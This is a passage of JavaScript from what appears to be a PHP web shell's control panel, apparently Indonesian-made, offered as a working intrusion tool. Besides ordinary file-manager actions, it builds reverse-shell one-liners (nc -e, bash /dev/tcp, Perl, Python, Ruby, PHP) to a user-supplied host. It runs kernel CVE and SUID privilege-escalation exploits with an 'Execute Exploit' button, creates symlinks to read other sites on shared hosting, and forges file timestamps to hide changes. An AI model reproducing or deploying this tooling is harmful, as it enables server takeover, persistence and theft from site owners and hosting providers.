    document.getElementById('chmodFileModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('chmodNewPerm').focus(); document.getElementById('chmodNewPerm').select(); }, 100);
}
function hideChmodFileModal() { document.getElementById('chmodFileModal').classList.add('hidden'); }
function doChmod() {
    var path = document.getElementById('chmodFilePath').value;
    var perm = document.getElementById('chmodNewPerm').value.trim();
    if (!perm || perm.length < 3 || perm.length > 4) { showToast('Please enter a valid permission (e.g. 0755)', 'warning'); return; }
    fileActionRequest({file_action: 'chmod', file_path: path, permission: perm}, function(r) {
        if (r.ok) {
            showToast('Permission changed to <b>' + perm + '</b> successfully', 'success', 4000, 'applepay');
            hideChmodFileModal();
            setTimeout(function() { location.reload(); }, 800);
        } else {
            showToast('Chmod failed: ' + (r.err || 'Unknown error'), 'error');
            playFailSound();
        }
    });
}


function showTouchModal(path, name, mtime) {
    document.getElementById('touchFilePath').value = path;
    document.getElementById('touchModalName').textContent = name;
    document.getElementById('touchResult').style.display = 'none';

    var curEl = document.getElementById('touchCurrentDate');
    if (mtime && mtime > 0) {
        var d = new Date(mtime * 1000);
        curEl.textContent = d.getFullYear() + '-'
            + String(d.getMonth()+1).padStart(2,'0') + '-'
            + String(d.getDate()).padStart(2,'0') + ' '
            + String(d.getHours()).padStart(2,'0') + ':'
            + String(d.getMinutes()).padStart(2,'0') + ':'
            + String(d.getSeconds()).padStart(2,'0');
        var iso = d.getFullYear() + '-'
            + String(d.getMonth()+1).padStart(2,'0') + '-'
            + String(d.getDate()).padStart(2,'0') + 'T'
            + String(d.getHours()).padStart(2,'0') + ':'
            + String(d.getMinutes()).padStart(2,'0');
        document.getElementById('touchNewDate').value = iso;
    } else {
        curEl.textContent = 'Unknown';
        document.getElementById('touchNewDate').value = '';
    }

    var btn = document.getElementById('touchSaveBtn');
    btn.disabled = false;
    btn.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="display:inline;vertical-align:middle;margin-right:5px;"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Apply';

    document.getElementById('touchModal').classList.remove('hidden');
}

function touchSetPreset(preset) {
    var d = new Date();
    if (preset === 'now') {
    } else if (preset === 'yesterday') {
        d.setDate(d.getDate() - 1);
    } else if (preset === 'week') {
        d.setDate(d.getDate() - 7);
    } else if (preset === 'month') {
        d.setMonth(d.getMonth() - 1);
    } else if (preset === 'random') {
        var start = new Date('2023-01-01').getTime();
        var end   = new Date('2024-12-31').getTime();
        d = new Date(start + Math.random() * (end - start));
    }
    var iso = d.getFullYear() + '-'
        + String(d.getMonth()+1).padStart(2,'0') + '-'
        + String(d.getDate()).padStart(2,'0') + 'T'
        + String(d.getHours()).padStart(2,'0') + ':'
        + String(d.getMinutes()).padStart(2,'0');
    document.getElementById('touchNewDate').value = iso;
}

function doTouch() {
    var path = document.getElementById('touchFilePath').value;
    var dt   = document.getElementById('touchNewDate').value;
    var btn  = document.getElementById('touchSaveBtn');
    var res  = document.getElementById('touchResult');
    if (!dt) { showToast('Please select a date and time', 'warning'); return; }
    btn.disabled = true;
    btn.textContent = 'Applying...';
    fileActionRequest({file_action: 'touch', file_path: path, touch_time: dt}, function(r) {
        if (r.ok) {
            res.style.display = 'block';
            res.style.background = 'rgba(34,197,94,0.08)';
            res.style.border = '1px solid rgba(34,197,94,0.25)';
            res.style.color = 'var(--green)';
            res.textContent = r.msg;
            document.getElementById('touchCurrentDate').textContent = r.formatted || '';
            showToast('Timestamp updated: <b>' + r.formatted + '</b>', 'success', 4000, 'applepay');
            btn.disabled = false;
            btn.textContent = 'Done!';
            setTimeout(function() {
                hideModal2('touchModal');
                location.reload();
            }, 900);
        } else {
            res.style.display = 'block';
            res.style.background = 'rgba(239,68,68,0.08)';
            res.style.border = '1px solid rgba(239,68,68,0.25)';
            res.style.color = '#f87171';
            res.textContent = r.err || 'Failed to update timestamp';
            btn.disabled = false;
            btn.textContent = 'Apply';
            playFailSound();
        }
    });
}

function hideModal2(id) { document.getElementById(id).classList.add('hidden'); }


function symSwitchTab(tab) {
    var tabs = ['php','perl','python','file'];
    tabs.forEach(function(t) {
        var btn  = document.getElementById('symTab_' + t);
        var pane = document.getElementById('symPane_' + t);
        if (t === tab) {
            btn.style.background = 'rgba(167,139,250,0.18)';
            btn.style.color = '#a78bfa';
            btn.style.borderBottomColor = '#a78bfa';
            btn.style.fontWeight = '700';
            pane.style.display = '';
        } else {
            btn.style.background = 'transparent';
            btn.style.color = 'var(--text-muted)';
            btn.style.borderBottomColor = 'transparent';
            btn.style.fontWeight = '400';
            pane.style.display = 'none';
        }
    });
}

function doSymlinkAction(mode) {
    var btn = event ? event.target : null;
    if (btn) { btn.disabled = true; btn.textContent = 'Running...'; }
    var body = '_xk=labs&file_action=create_symlink&sym_mode=' + mode + '&target_dir=' + encodeURIComponent(window._currentDir || '');
    fetch(_LPSELF, {
        method: 'POST',
        headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body: body
    })
    .then(function(r){ return r.json(); })
    .then(function(data) {
        if (btn) { btn.disabled = false; btn.textContent = btn.textContent.includes('Perl') ? 'Run Symlink Perl' : btn.textContent.includes('Python') ? 'Run Symlink Python' : 'Run Symlink PHP'; }
        if (mode === 'symphp') {
            var res = document.getElementById('symResult_php');
            res.style.display = '';
            var urlEl = document.getElementById('symRootUrl');
            if (data.root_url) urlEl.innerHTML = 'Root URL: <a href="' + data.root_url + '" target="_blank" style="color:#a78bfa;">' + data.root_url + '</a>';
            var body = document.getElementById('symDomainBody');
            var nodom = document.getElementById('symNoDomains');
            body.innerHTML = '';
            if (data.rows && data.rows.length > 0) {
                nodom.style.display = 'none';
                data.rows.forEach(function(row, i) {
                    var tr = document.createElement('tr');
                    tr.style.borderBottom = '1px solid rgba(255,255,255,0.04)';
                    tr.innerHTML = '<td style="padding:5px 8px;color:#facc15;">' + (i+1) + '</td>'
                        + '<td style="padding:5px 8px;"><a href="http://' + row.domain + '" target="_blank" style="color:#22d3ee;">' + row.domain + '</a></td>'
                        + '<td style="padding:5px 8px;color:#fff;">' + row.owner + '</td>'
                        + '<td style="padding:5px 8px;text-align:center;"><a href="' + row.url + '" target="_blank" style="color:#f87171;font-weight:600;">Symlink</a></td>';
                    body.appendChild(tr);
                });
            } else {
                nodom.style.display = '';
            }
            if (!data.ok) { showToast('symlink() disabled — root may not have been created', 'error'); }
        } else if (mode === 'symperl' || mode === 'sympy') {
            var paneKey = mode === 'symperl' ? 'perl' : 'python';
            var pre = document.getElementById('symResult_' + paneKey);
            pre.style.display = '';
            pre.textContent = (data.output || 'No output') + (data.base_url ? '\n\nBase URL: ' + data.base_url : '');
            if (data.ok) showToast('Symlink script executed', 'success');
            else showToast(data.err || 'Error', 'error');
        }
    })
    .catch(function(e) {
        if (btn) { btn.disabled = false; }
        showToast('Request failed: ' + e.message, 'error');
    });
}

function showSymlinkModal() {
    document.getElementById('symlinkTarget').value = '';
    document.getElementById('symlinkName').value = '';
    document.getElementById('symlinkPreview').textContent = 'symlink: link_name -> /target/path';
    document.getElementById('symResult_php').style.display  = 'none';
    document.getElementById('symResult_perl').style.display = 'none';
    document.getElementById('symResult_python').style.display = 'none';
    document.getElementById('symResult_file').style.display = 'none';
    symSwitchTab('php');
    document.getElementById('symlinkModal').classList.remove('hidden');
}
function updateSymlinkPreview() {
    var t = document.getElementById('symlinkTarget').value.trim() || '/target/path';
    var n = document.getElementById('symlinkName').value.trim() || 'link_name';
    document.getElementById('symlinkPreview').textContent = 'symlink: ' + n + ' -> ' + t;
}
function doCreateSymlink() {
    var target = document.getElementById('symlinkTarget').value.trim();
    var name   = document.getElementById('symlinkName').value.trim();
    if (!target) { showToast('Please enter a target path', 'warning'); return; }
    if (!name)   { showToast('Please enter a link name',   'warning'); return; }
    fileActionRequest({
        file_action:     'create_symlink',
        sym_mode:        'file',
        symlink_target:  target,
        symlink_name:    name,
        target_dir:      '<?php echo addslashes($currentDirectory); ?>'
    }, function(r) {
        var resEl = document.getElementById('symResult_file');
        resEl.style.display = '';
        if (r.ok) {
            var link = r.url ? ' &nbsp;<a href="' + r.url + '" target="_blank" style="color:#a78bfa;font-size:10px;">Open &rarr;</a>' : '';
            resEl.innerHTML = '<div style="color:#4ade80;font-size:11px;font-family:monospace;padding:6px 8px;background:rgba(74,222,128,0.07);border-radius:4px;">[OK] ' + (r.msg || 'Symlink created') + link + '</div>';
            showToast(r.msg || 'Symlink created', 'success', 4000, 'applepay');
            setTimeout(function() { location.reload(); }, 1500);
        } else {
            resEl.innerHTML = '<div style="color:#f87171;font-size:11px;font-family:monospace;padding:6px 8px;background:rgba(248,113,113,0.07);border-radius:4px;">[ERR] ' + (r.err || 'Unknown error') + '</div>';
            showToast('Failed: ' + (r.err || 'Unknown error'), 'error');
            playFailSound();
        }
    });
}


function showAutoRootModal() {
    document.getElementById('arStatus').textContent = 'Click Scan to detect kernel';
    document.getElementById('arStatus').style.color = 'var(--text-muted)';
    document.getElementById('arExploitList').style.display = 'none';
    document.getElementById('arSuidList').style.display = 'none';
    document.getElementById('arLogPanel').style.display = 'none';
    document.getElementById('arRootBanner').style.display = 'none';
    document.getElementById('arFailBanner').style.display = 'none';
    document.getElementById('arCustomCmd').value = '';
    ['arKernel','arArch','arUser','arUid','arGcc','arWritable','arSudo','arDocker','arOs'].forEach(function(id){
        document.getElementById(id).textContent = '-';
    });
    document.getElementById('autoRootModal').classList.remove('hidden');
}

var _arScanData = null;

function doAutoRootScan() {
    var btn = document.getElementById('arScanBtn');
    btn.disabled = true;
    btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;animation:spin 1s linear infinite;"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg> Scanning...';
    document.getElementById('arStatus').textContent = 'Scanning kernel, detecting CVEs...';
    document.getElementById('arStatus').style.color = '#f59e0b';

    fileActionRequest({file_action: 'auto_root_scan'}, function(r) {
        btn.disabled = false;
        btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg> Re-Scan';
        if (!r.ok) {
            document.getElementById('arStatus').textContent = 'Scan failed: ' + (r.err || 'Unknown');
            document.getElementById('arStatus').style.color = '#f85149';
            return;
        }
        _arScanData = r;
        var info = r.info;
        document.getElementById('arKernel').textContent = info.kernel || 'unknown';
        document.getElementById('arArch').textContent = info.arch || 'unknown';
        document.getElementById('arUser').textContent = info.user || 'unknown';
        document.getElementById('arUid').textContent = info.uid || 'unknown';
        document.getElementById('arGcc').textContent = info.gcc || 'not found';
        document.getElementById('arGcc').style.color = (info.gcc && info.gcc !== 'not found') ? '#3fb950' : '#f85149';
        document.getElementById('arWritable').textContent = info.writable_dir || 'none';
        document.getElementById('arSudo').textContent = info.sudo || 'N/A';
        document.getElementById('arDocker').textContent = info.docker_sock === 'yes' ? 'Socket found!' : 'No';
        document.getElementById('arDocker').style.color = info.docker_sock === 'yes' ? '#f59e0b' : 'var(--text-muted)';
        document.getElementById('arOs').textContent = (info.os || 'unknown').replace(/\n/g, ' | ');

        if (info.uid && info.uid.indexOf('uid=0') !== -1) {
            document.getElementById('arStatus').innerHTML = '<span style="color:#3fb950;font-weight:600;">Already running as root!</span>';
            document.getElementById('arUser').style.color = '#3fb950';
        } else {
            document.getElementById('arStatus').textContent = 'Scan complete - ' + r.exploits.length + ' exploit(s) found';
            document.getElementById('arStatus').style.color = r.exploits.length > 0 ? '#3fb950' : '#f85149';
        }

        var eDiv = document.getElementById('arExploits');
        eDiv.innerHTML = '';
        document.getElementById('arExploitCount').textContent = r.exploits.length;
        if (r.exploits.length > 0) {
            document.getElementById('arExploitList').style.display = 'block';
            r.exploits.forEach(function(ex, idx) {
                var sevColors = {CRITICAL:'#ef4444',HIGH:'#f97316',MEDIUM:'#f59e0b',LOW:'#3fb950'};
                var sevBg = {CRITICAL:'239,68,68',HIGH:'249,115,22',MEDIUM:'245,158,11',LOW:'63,185,80'};
                var sc = sevColors[ex.severity] || '#888';
                var sb2 = sevBg[ex.severity] || '136,136,136';
                var hasGcc = info.gcc && info.gcc !== 'not found';
                var needsCompile = ex.compile && ex.compile.indexOf('gcc') !== -1;
                var canRun = !needsCompile || hasGcc;
                var card = '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:12px;border-left:3px solid '+sc+';">';
                card += '<div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:6px;">';
                card += '<div><span style="font-size:12px;font-weight:700;color:var(--text-primary);">'+esc(ex.name)+'</span>';
                card += ' <span style="font-size:9px;padding:2px 6px;border-radius:3px;background:rgba(0,212,255,0.1);color:#00d4ff;border:1px solid rgba(0,212,255,0.2);font-family:monospace;">'+esc(ex.cve)+'</span></div>';
                card += '<span style="font-size:9px;padding:2px 8px;border-radius:10px;background:rgba('+sb2+',0.12);color:'+sc+';font-weight:600;">'+ex.severity+'</span></div>';
                card += '<p style="font-size:10px;color:var(--text-muted);margin-bottom:8px;">'+esc(ex.desc)+'</p>';
                if (ex.compile) card += '<div style="font-size:9px;color:var(--text-muted);margin-bottom:4px;">Compile: <code style="background:rgba(0,0,0,0.3);padding:1px 4px;border-radius:2px;color:#00d4ff;">'+esc(ex.compile)+'</code></div>';
                if (ex.run) card += '<div style="font-size:9px;color:var(--text-muted);margin-bottom:8px;">Run: <code style="background:rgba(0,0,0,0.3);padding:1px 4px;border-radius:2px;color:#3fb950;">'+esc(ex.run.length > 100 ? ex.run.substring(0,100)+'...' : ex.run)+'</code></div>';
                if (!canRun) {
                    card += '<div style="font-size:9px;color:#f85149;margin-bottom:6px;">Requires GCC (not found)</div>';
                }
                card += '<button class="btn btn-sm" style="background:'+sc+';border-color:'+sc+';color:#fff;font-weight:600;font-size:10px;" '+(canRun?'':'disabled')+' onclick="doAutoRootExploit('+idx+')">Execute Exploit</button>';
                card += '</div>';
                eDiv.innerHTML += card;
            });
        } else {
            document.getElementById('arExploitList').style.display = 'block';
            eDiv.innerHTML = '<div style="text-align:center;padding:16px;color:var(--text-muted);font-size:11px;">No known kernel CVE exploits matched this kernel version.<br>Try SUID binaries or custom commands below.</div>';
        }

        var sDiv = document.getElementById('arSuids');
        sDiv.innerHTML = '';
        document.getElementById('arSuidCount').textContent = r.suid_exploits.length;
        if (r.suid_exploits.length > 0) {
            document.getElementById('arSuidList').style.display = 'block';
            r.suid_exploits.forEach(function(s) {
                sDiv.innerHTML += '<div style="background:rgba(167,139,250,0.08);border:1px solid rgba(167,139,250,0.2);border-radius:6px;padding:6px 10px;font-size:10px;cursor:pointer;" onclick="document.getElementById(\'arCustomCmd\').value=\''+esc(s.bin)+' [exploit_args]\';" title="'+esc(s.bin)+'">'
                    + '<span style="color:#a78bfa;font-weight:600;">'+esc(s.name)+'</span>'
                    + ' <span style="color:var(--text-muted);font-size:9px;">SUID</span></div>';
            });
        }

        showToast('Scan complete: ' + r.exploits.length + ' exploit(s) found', r.exploits.length > 0 ? 'success' : 'info');
    });
}

function doAutoRootExploit(idx) {
    if (!_arScanData || !_arScanData.exploits[idx]) return;
    var ex = _arScanData.exploits[idx];
    document.getElementById('arLogPanel').style.display = 'block';
    document.getElementById('arRootBanner').style.display = 'none';
    document.getElementById('arFailBanner').style.display = 'none';
    var logEl = document.getElementById('arLog');
    logEl.textContent = '[*] Executing: ' + ex.name + ' (' + ex.cve + ')\n[*] Please wait...\n';
    logEl.scrollTop = logEl.scrollHeight;

    fileActionRequest({
        file_action: 'auto_root_exec',
        exploit_url: ex.url || '',
        compile_cmd: ex.compile || '',
        run_cmd: ex.run || ''
    }, function(r) {
        if (!r.ok) {
            logEl.textContent += '\n[!] Error: ' + (r.err || 'Unknown');
            document.getElementById('arFailBanner').style.display = 'block';
            playFailSound();
            return;
        }
        logEl.textContent = r.log || '(no output)';
        logEl.scrollTop = logEl.scrollHeight;
        if (r.is_root) {
            document.getElementById('arRootBanner').style.display = 'block';
            document.getElementById('arRootInfo').textContent = 'User: ' + r.user + ' | ' + r.id;
            showToast('ROOT ACCESS OBTAINED!', 'success', 5000, 'applepay');
            var promptEl = document.querySelector('.cmd-dollar');
            if (promptEl) { promptEl.textContent = '#'; promptEl.style.color = '#ef4444'; }
            var userEl = document.querySelector('.cmd-user');
            if (userEl) userEl.textContent = 'root@' + (userEl.textContent.split('@')[1] || 'localhost');
        } else {
            document.getElementById('arFailBanner').style.display = 'block';
            playFailSound();
        }
    });
}

function doAutoRootCustom() {
    var cmd = document.getElementById('arCustomCmd').value.trim();
    if (!cmd) { showToast('Enter a command', 'warning'); return; }
    document.getElementById('arLogPanel').style.display = 'block';
    document.getElementById('arRootBanner').style.display = 'none';
    document.getElementById('arFailBanner').style.display = 'none';
    var logEl = document.getElementById('arLog');
    logEl.textContent = '[*] Running custom: ' + cmd + '\n[*] Please wait...\n';

    fileActionRequest({
        file_action: 'auto_root_exec',
        custom_cmd: cmd
    }, function(r) {
        if (!r.ok) {
            logEl.textContent += '\n[!] Error: ' + (r.err || 'Unknown');
            document.getElementById('arFailBanner').style.display = 'block';
            playFailSound();
            return;
        }
        logEl.textContent = r.log || '(no output)';
        logEl.scrollTop = logEl.scrollHeight;
        if (r.is_root) {
            document.getElementById('arRootBanner').style.display = 'block';
            document.getElementById('arRootInfo').textContent = 'User: ' + r.user + ' | ' + r.id;
            showToast('ROOT ACCESS OBTAINED!', 'success', 5000, 'applepay');
            var promptEl = document.querySelector('.cmd-dollar');
            if (promptEl) { promptEl.textContent = '#'; promptEl.style.color = '#ef4444'; }
        } else {
            document.getElementById('arFailBanner').style.display = 'block';
            playFailSound();
        }
    });
}


function showBackconnectModal() {
    document.getElementById('bcHost').value = '';
    document.getElementById('bcPort').value = '';
    document.getElementById('bcType').value = 'php';
    document.getElementById('bcResult').style.display = 'none';
    updateBcPreview();
    document.getElementById('backconnectModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('bcHost').focus(); }, 100);
}
function updateBcPreview() {
    var host = document.getElementById('bcHost').value.trim() || 'HOST';
    var port = document.getElementById('bcPort').value.trim() || 'PORT';
    var type = document.getElementById('bcType').value;
    var cmds = {
        php: 'fsockopen("' + host + '", ' + port + ') + proc_open("/bin/sh -i")',
        perl: "perl -e 'use Socket;$i=\"" + host + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,...);exec(\"/bin/sh -i\");'",
        python: "python3 -c 'import socket,subprocess,os;s.connect((\"" + host + "\"," + port + "));...'",
        nc: 'nc -e /bin/sh ' + host + ' ' + port,
        bash: "bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'",
        ruby: "ruby -rsocket -e 'f=TCPSocket.open(\"" + host + "\"," + port + ").to_i;exec ...'"
    };
    document.getElementById('bcPreview').textContent = cmds[type] || '';
}
function doBackconnect() {
    var host = document.getElementById('bcHost').value.trim();
    var port = document.getElementById('bcPort').value.trim();
    var type = document.getElementById('bcType').value;
    if (!host) { showToast('Please enter a host/IP', 'warning'); return; }
    if (!port || parseInt(port) < 1 || parseInt(port) > 65535) { showToast('Please enter a valid port (1-65535)', 'warning'); return; }
    var btn = document.getElementById('bcConnBtn');
    btn.disabled = true; btn.textContent = 'Connecting...';
    var resDiv = document.getElementById('bcResult');
    resDiv.style.display = 'block';
    resDiv.innerHTML = '<span style="color: var(--text-muted);">Attempting connection to ' + host + ':' + port + ' via ' + type + '...</span>';
    fileActionRequest({
        file_action: 'backconnect',
        bc_type: type,
        bc_host: host,
        bc_port: port
    }, function(r) {
        btn.disabled = false;
        btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg> Connect';
        if (r.ok) {
            var html = '<span style="color: #3fb950;">' + (r.msg || 'Connected') + '</span>';
            if (r.output) html += '<br><span style="color: var(--text-muted);">Output: ' + r.output.replace(/</g,'&lt;') + '</span>';
            if (r.exec_used) html += '<br><span style="color: #00d4ff; font-size:9px;">exec via: ' + r.exec_used + '</span>';
            resDiv.innerHTML = html;
            showToast(r.msg || 'Backconnect launched', 'success', 5000, 'applepay');
        } else {
            resDiv.innerHTML = '<span style="color: #f85149;">Error: ' + (r.err || 'Unknown') + '</span>';
            showToast('Backconnect failed: ' + (r.err || 'Unknown'), 'error');
            playFailSound();
        }
    });
}
document.getElementById('bcHost').addEventListener('input', updateBcPreview);
document.getElementById('bcPort').addEventListener('input', updateBcPreview);


function showCreateFolderModal() {
    document.getElementById('newFolderName').value = '';
    document.getElementById('createFolderModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('newFolderName').focus(); }, 100);
}
function doCreateFolder() {
    var name = document.getElementById('newFolderName').value.trim();
    if (!name) { showToast('Please enter a folder name', 'warning'); return; }
    fileActionRequest({file_action: 'create_folder', folder_name: name, target_dir: '<?php echo addslashes($currentDirectory); ?>'}, function(r) {
        if (r.ok) {
            showToast('Folder <b>' + name + '</b> created', 'success', 4000, 'applepay');
            hideModal2('createFolderModal');
            setTimeout(function() { location.reload(); }, 800);
        } else {
            showToast('Failed: ' + (r.err || 'Unknown error'), 'error');
            playFailSound();
        }
    });
}


function showCreateFileModal() {
    document.getElementById('newFileName').value = '';
    document.getElementById('newFileContent').value = '';
    document.getElementById('createFileModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('newFileName').focus(); }, 100);
}
function doCreateFile() {
    var name = document.getElementById('newFileName').value.trim();
    if (!name) { showToast('Please enter a file name', 'warning'); return; }
    var content = document.getElementById('newFileContent').value;
    fileActionRequest({file_action: 'create_file', file_name: name, file_content: content, target_dir: '<?php echo addslashes($currentDirectory); ?>'}, function(r) {
        if (r.ok) {
            showToast('File <b>' + name + '</b> created', 'success', 4000, 'applepay');
            hideModal2('createFileModal');
            setTimeout(function() { location.reload(); }, 800);
        } else {
            showToast('Failed: ' + (r.err || 'Unknown error'), 'error');
            playFailSound();
        }
    });
}


function toggleSelectAll(el) {
    var boxes = document.querySelectorAll('.file-checkbox');
    boxes.forEach(function(b) { b.checked = el.checked; });
    updateBulkBar();
}
function getSelectedPaths() {
    var paths = [];
    document.querySelectorAll('.file-checkbox:checked').forEach(function(b) { paths.push(b.value); });
    return paths;
}
function updateBulkBar() {
    var paths = getSelectedPaths();
    var bar = document.getElementById('bulkBar');
    if (paths.length > 0) {
        bar.style.display = 'flex';
        document.getElementById('bulkCount').textContent = paths.length;
    } else {
        bar.style.display = 'none';
    }
    var all = document.querySelectorAll('.file-checkbox');
    var checked = document.querySelectorAll('.file-checkbox:checked');
    var sa = document.getElementById('selectAllFiles');
    if (sa) sa.checked = all.length > 0 && all.length === checked.length;
}
function clearSelection() {
    document.querySelectorAll('.file-checkbox').forEach(function(b) { b.checked = false; });
    var sa = document.getElementById('selectAllFiles'); if (sa) sa.checked = false;
    updateBulkBar();
}
function bulkAction(type) {
    var paths = getSelectedPaths();
    if (paths.length === 0) { showToast('No files selected', 'warning'); return; }
    if (type === 'download') {
        if (paths.length === 1) {
            window.location.href = '?dl=' + encodeURIComponent(paths[0]) + '&_xk=labs';
        } else {
            showToast('Multiple files selected. Compressing to ZIP for download...', 'info', 3000);
            fileActionRequest({file_action: 'compress_zip', paths: JSON.stringify(paths), target_dir: '<?php echo addslashes($currentDirectory); ?>', zip_name: 'download_' + Date.now() + '.zip'}, function(r) {
                if (r.ok && r.zip_path) {
                    showToast('Compressed. Starting download...', 'success', 3000, 'applepay');
                    setTimeout(function() { window.location.href = '?dl=' + encodeURIComponent(r.zip_path) + '&_xk=labs'; }, 500);
                } else {
                    showToast('Compress failed: ' + (r.err || 'Unknown'), 'error'); playFailSound();
                }
            });
        }
    } else if (type === 'lock') {
        showMassLockModal(paths, 'Lock ' + paths.length + ' File Terpilih');
    } else if (type === 'zip') {
        document.getElementById('zipFileName').value = 'archive_' + Date.now() + '.zip';
        document.getElementById('zipNameModal').classList.remove('hidden');
    } else if (type === 'delete') {
        var pathsCopy = paths.slice();
        var icon = '<polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/>';
        showConfirm({
            title:  'Hapus ' + pathsCopy.length + ' Item',
            msg:    'Yakin ingin menghapus <strong>' + pathsCopy.length + '</strong> item yang dipilih?',
            detail: pathsCopy.slice(0, 5).map(function(p){ return p.split('/').pop(); }).join('<br>') + (pathsCopy.length > 5 ? '<br><span style="opacity:0.6;">+ ' + (pathsCopy.length - 5) + ' lainnya</span>' : ''),
            warn:   'Tindakan ini tidak dapat dibatalkan. Semua item akan dihapus permanen.',
            color:  '#f85149', colorAlpha: 'rgba(248,81,73,',
            icon:   icon, okIcon: icon,
            okLabel:   'Hapus ' + pathsCopy.length + ' Item',
            cancelLabel: 'Batal',
            onOk: function() {
                fileActionRequest({file_action: 'mass_delete', paths: JSON.stringify(pathsCopy)}, function(r) {
                    if (r.ok) {
                        showToast('Deleted <b>' + r.deleted + '</b> items' + (r.failed > 0 ? ', <b>' + r.failed + '</b> failed' : ''), r.failed > 0 ? 'warning' : 'success', 4000, 'applepay');
                        clearSelection();
                        setTimeout(function() { location.reload(); }, 800);
                    } else {
                        showToast('Delete failed: ' + (r.err || 'Unknown'), 'error'); playFailSound();
                    }
                });
            }
        });
    }
}
function doCompressZip() {
    var paths = getSelectedPaths();
    var zipName = document.getElementById('zipFileName').value.trim() || 'archive.zip';
    if (paths.length === 0) { showToast('No files selected', 'warning'); return; }
    hideModal2('zipNameModal');
    showToast('Compressing ' + paths.length + ' items...', 'info', 3000);
    fileActionRequest({file_action: 'compress_zip', paths: JSON.stringify(paths), target_dir: '<?php echo addslashes($currentDirectory); ?>', zip_name: zipName}, function(r) {
        if (r.ok) {
            showToast(r.msg, 'success', 4000, 'applepay');
            clearSelection();
            setTimeout(function() { location.reload(); }, 800);
        } else {
            showToast('Compress failed: ' + (r.err || 'Unknown'), 'error'); playFailSound();
        }
    });
}


function extractZip(zipPath) {
    var fileName = zipPath.split('/').pop();
    var dirPath = zipPath.substring(0, zipPath.lastIndexOf('/')) || '/';
    document.getElementById('unzipFileName').textContent = fileName;
    document.getElementById('unzipFileSize').textContent = 'Location: ' + dirPath;
    document.getElementById('unzipDestination').value = dirPath;
    document.getElementById('unzipPath').value = zipPath;
    document.getElementById('unzipProgress').style.display = 'none';
    document.getElementById('unzipResult').style.display = 'none';
    document.getElementById('unzipFooter').style.display = 'flex';
    document.getElementById('unzipModal').classList.remove('hidden');
}

function doExtractZip() {
    var zipPath = document.getElementById('unzipPath').value;
    var extractTo = document.getElementById('unzipDestination').value.trim();
    var fileName = zipPath.split('/').pop();
    
    document.getElementById('unzipProgress').style.display = 'block';
    document.getElementById('unzipFooter').style.display = 'none';
    document.getElementById('unzipResult').style.display = 'none';
    
    fileActionRequest({file_action: 'extract_zip', zip_path: zipPath, extract_to: extractTo}, function(r) {
        document.getElementById('unzipProgress').style.display = 'none';
        var resultDiv = document.getElementById('unzipResult');
        
        if (r.ok) {
            resultDiv.innerHTML = '<div style="background:rgba(63,185,80,0.1);border:1px solid rgba(63,185,80,0.3);border-radius:8px;padding:14px;text-align:center;">' +
                '<div style="width:40px;height:40px;background:rgba(63,185,80,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 10px;">' +
                '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#3fb950" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg></div>' +
                '<div style="font-size:13px;font-weight:600;color:#3fb950;">Extraction Complete</div>' +
                '<div style="font-size:11px;color:var(--text-muted);margin-top:4px;">' + esc(r.msg || 'Files extracted successfully') + '</div>' +
                '</div>';
            resultDiv.style.display = 'block';
            document.getElementById('unzipFooter').innerHTML = '<button class="btn" style="background:#3fb950;border-color:#3fb950;color:#000;font-weight:600;" onclick="location.reload()">Refresh Page</button>';
            document.getElementById('unzipFooter').style.display = 'flex';
            document.getElementById('unzipFooter').style.justifyContent = 'center';
            showToast('Extracted ' + fileName, 'success');
        } else {
            resultDiv.innerHTML = '<div style="background:rgba(248,81,73,0.1);border:1px solid rgba(248,81,73,0.3);border-radius:8px;padding:14px;text-align:center;">' +
                '<div style="width:40px;height:40px;background:rgba(248,81,73,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 10px;">' +
                '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f85149" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div>' +
                '<div style="font-size:13px;font-weight:600;color:#f85149;">Extraction Failed</div>' +
                '<div style="font-size:11px;color:var(--text-muted);margin-top:4px;">' + esc(r.err || 'Unknown error') + '</div>' +
                '</div>';
            resultDiv.style.display = 'block';
            document.getElementById('unzipFooter').innerHTML = '<button class="btn btn-secondary" onclick="hideModal2(\'unzipModal\')">Close</button>' +
                '<button class="btn" style="background:#f59e0b;border-color:#f59e0b;color:#000;font-weight:600;" onclick="doExtractZip()">Retry</button>';
            document.getElementById('unzipFooter').style.display = 'flex';
            playFailSound();
        }
    });
}



function showLockModal(path, name) {
    document.getElementById('lockModalPath').textContent = path;
    document.getElementById('lockModalPerm').value = '0444';
    document.getElementById('lockFileModal').classList.remove('hidden');
}

function doLockFile() {
    var path = document.getElementById('lockModalPath').textContent.trim();
